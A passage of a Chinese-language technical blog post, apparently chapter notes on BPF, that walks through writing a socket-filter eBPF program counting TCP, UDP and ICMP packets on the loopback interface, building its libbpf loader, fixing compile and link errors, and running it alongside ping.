class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_skb = <span class="built_in">strncmp</span>(event, <span class="string">"sk_skb"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_msg = <span class="built_in">strncmp</span>(event, <span class="string">"sk_msg"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>代码所做的第一件事是在节头和内部变量之间创建关联——就像<code>SEC(&quot;socket&quot;)</code>一样，我们最终会得到<code>bool is_socket=true</code></p><p>之后在同一个文件中，我们看到了一组if指令，它们创建了header和实际<code>prog_type</code>之间的关联，因此对于<code>is_socket</code>，我们最终得到<code>BPF_PROG_TYPE_SOCKET_FILTER</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_socket) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCKET_FILTER;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_kprobe || is_kretprobe) &#123; </span><br><span class="line">  prog_type = BPF_PROG_TYPE_KPROBE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_raw_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_RAW_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_xdp) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_XDP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_perf_event) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_PERF_EVENT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_sk) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SOCK;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sockops) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCK_OPS;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_msg) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_MSG;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Unknown event '%s'\n"</span>, event); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们想编写一个<code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序，我们需要指定一个<code>SEC(&quot;socket&quot;)</code>作为我们函数的ELF头，它将作为BPF程序的入口点。</p><p>正如从该列表中看到的那样，有多种与套接字和一般网络操作相关的程序类型。在本章中，我们将展示<code>BPF_PROG_TYPE_SOCKET_FILTER</code>的示例；此外，后面我们将讨论程序类型为 <code>BPF_PROG_TYPE_XDP</code>的XDP程序。</p><p>我们想要存储遇到的每个协议的数据包计数，需要创建一个键/值映射，其中协议是键，数据包计数为值。为此可以使用<code>BPF_MAP_TYPE_ARRAY</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该映射是使用<code>bpf_map_def</code>结构定义的，它将被命名为<code>countmap</code>以供程序中引用。</p><p>此时，我们可以编写一些代码来实际计算数据包。<code>BPF_PROG_TYPE_SOCKET_FILTER</code>类型的程序是我们的选择之一，因为通过使用这样的程序，我们可以看到所有流经接口的数据包。因此我们使用<code>SEC(&quot;socket&quot;)</code>将程序附加到正确的头部：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol)); <span class="keyword">int</span> one=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line"><span class="keyword">if</span> (el) &#123;</span><br><span class="line">(*el)++; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">el = &amp;one; </span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ELF头附加之后，我们可以使用<code>load_byte</code>函数从<code>sk_buff</code>结构中提取协议部分。然后使用协议ID作为键来执行<code>bpf_map_lookup_elem</code>操作以从计数映射中提取当前计数器值，以便我们可以将其递增，如果它是第一个数据包，我们可以将其设置为1。现在我们可以使用 <code>bpf_map_update_elem</code>用增加的值更新映射。</p><p>完整的<code>bpf_program.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> offsetof</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp; ((TYPE *)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used)) </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_def</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> type;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*bpf_map_update_elem)</span><span class="params">(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">void</span> *value, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map_def *<span class="built_in">map</span>, <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">load_byte</span><span class="params">(<span class="keyword">void</span> *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> off)</span> <span class="title">asm</span><span class="params">(<span class="string">"llvm.bpf.load.byte"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123;</span><br><span class="line">    .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">    .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol));</span><br><span class="line">  <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line">  <span class="keyword">if</span> (el) &#123;</span><br><span class="line">    (*el)++;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    el = &amp;one;</span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br><span class="line">In file included from bpf_program.c:6:</span><br><span class="line">In file included from /usr/include/linux/string.h:7:</span><br><span class="line">In file included from /usr/include/string.h:26:</span><br><span class="line">In file included from /usr/include/bits/libc-header-start.h:33:</span><br><span class="line">In file included from /usr/include/features.h:452:</span><br><span class="line">/usr/include/gnu/stubs.h:7:11: fatal error: 'gnu/stubs-32.h' file not found</span><br><span class="line"><span class="meta">#</span><span class="bash"> include &lt;gnu/stubs-32.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure><p>解决办法如下</p><p><a href="https://github.com/cilium/cilium/issues/368" target="_blank" rel="noopener">https://github.com/cilium/cilium/issues/368</a></p><p>重新编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><h5 id="加载并附加到网络接口"><a href="#加载并附加到网络接口" class="headerlink" title="加载并附加到网络接口"></a>加载并附加到网络接口</h5><p>加载程序是实际打开我们编译的BPF ELF二进制文件<code>bpf_program.o</code>的程序，并将定义的BPF程序及其映射附加到一个套接字，该套接字是针对所观察的接口创建的，在我们的例子中是环回接口。</p><p>loader最重要的部分是ELF文件的加载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这将通过添加一个元素来填充<code>prog_fd</code>数组，该元素是我们加载的程序的文件描述符，我们现在可以将其附加到使用<code>open_raw_sock</code>打开的环回接口的套接字描述符上。</p><p>通过将选项<code>SO_ATTACH_BPF</code>设置为为接口打开的原始套接字来完成附加。</p><p>此时，我们的用户空间加载器能够在内核发送映射元素时查找它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>为了进行查找，我们使用for循环和<code>bpf_map_look_elem</code>附加到数组映射，以便我们可以分别读取和打印TCP、UDP和ICMP数据包计数器的值</p><p><code>loader.c</code>程序完整代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/bpf_load.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bpf/sock_example.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock = <span class="number">-1</span>, i, key;</span><br><span class="line">  <span class="keyword">int</span> tcp_cnt, udp_cnt, icmp_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">256</span>];</span><br><span class="line">  <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"%s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (load_bpf_file(filename)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sock = open_raw_sock(<span class="string">"lo"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, prog_fd,</span><br><span class="line">                 <span class="keyword">sizeof</span>(prog_fd[<span class="number">0</span>]))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"setsockopt %s\n"</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    key = IPPROTO_TCP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;tcp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_UDP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;udp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    key = IPPROTO_ICMP;</span><br><span class="line">    assert(bpf_map_lookup_elem(map_fd[<span class="number">0</span>], &amp;key, &amp;icmp_cnt) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"TCP %d UDP %d ICMP %d packets\n"</span>, tcp_cnt, udp_cnt, icmp_cnt);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个程序使用的是<code>libbpf</code>，所以我们需要在下载的源码中编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# pwd</span><br><span class="line">/root/linux-5.4/tools/lib/bpf</span><br><span class="line">[root@VM-16-14-centos bpf]# make</span><br><span class="line">Auto-detecting system features:</span><br><span class="line">...                        libelf: [ on  ]</span><br><span class="line">...                           bpf: [ on  ]</span><br><span class="line"></span><br><span class="line">  HOSTCC   fixdep.o</span><br><span class="line">  HOSTLD   fixdep-in.o</span><br><span class="line">  LINK     fixdep</span><br><span class="line">  MKDIR    staticobjs/</span><br></pre></td></tr></table></figure><p>接着我们可以使用如下脚本编译加载器：</p><p><code>build-loader.sh</code>代码如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_SRCTREE=$1</span><br><span class="line">LIBBPF=$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/libbpf.a</span><br><span class="line">clang -o loader-bin -I$&#123;KERNEL_SRCTREE&#125;/tools/lib/bpf/ \</span><br><span class="line"><span class="meta">  -I$</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/tools/lib -I<span class="variable">$&#123;KERNEL_SRCTREE&#125;</span>/tools/include \</span></span><br><span class="line"><span class="meta">  -I$</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/tools/perf -I<span class="variable">$&#123;KERNEL_SRCTREE&#125;</span>/samples \</span></span><br><span class="line"><span class="meta">  $</span><span class="bash">&#123;KERNEL_SRCTREE&#125;/samples/bpf/bpf_load.c \</span></span><br><span class="line">  loader.c "$&#123;LIBBPF&#125;" -lelf</span><br></pre></td></tr></table></figure><p>该脚本包含一堆头文件和内核本身的<code>libbpf</code>库，因此它必须知道在哪里可以找到内核源码。 为此可以在其中替换<code>$KERNEL_SRCTREE</code>或将该脚本写入文件并使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./build-loader.sh /root/linux-5.4</span><br></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/loader-19267c.o:(.bss+0x0): multiple definition of `bpf_log_buf&apos;</span><br><span class="line">/tmp/bpf_load-33a95f.o:(.bss+0x1000): first defined here</span><br><span class="line">clang-12: error: linker command failed with exit code 1 (use -v to see invocation)</span><br></pre></td></tr></table></figure><p>解决方法如下</p><p><a href="https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies" target="_blank" rel="noopener">https://stackoverflow.com/questions/12511044/bss0x0-multiple-definition-of-proxies</a></p><p>即在全局变量前声明<code>extern</code>，这里我们在<code>char bpf_log_buf[BPF_LOG_BUF_SIZE]</code>处声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SIZE];</span><br></pre></td></tr></table></figure><p>之后重新编译会创建一个<code>loader-bin</code>文件，最终可以启动BPF程序的ELF文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br></pre></td></tr></table></figure><p>程序加载并启动后，将执行10次转储，每秒一次显示三个协议中的每一个的数据包计数。因为程序连接到环回设备<code>lo</code>，所以你可以与加载程序一起运行ping并看到ICMP计数器增加。</p><p>运行ping来生成到<code>localhost</code>的ICMP流量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ping -c 100 127.0.0.1</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.100 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.107 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.102 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.105 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.093 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=7 ttl=64 time=0.104 ms</span><br><span class="line"> 64 bytes from 127.0.0.1: icmp_seq=8 ttl=64 time=0.142 ms</span><br></pre></td></tr></table></figure><p>在另一个终端中运行我们的BPF程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ./loader-bin bpf_program.o</span><br><span class="line"> TCP 0 UDP 0 ICMP 0 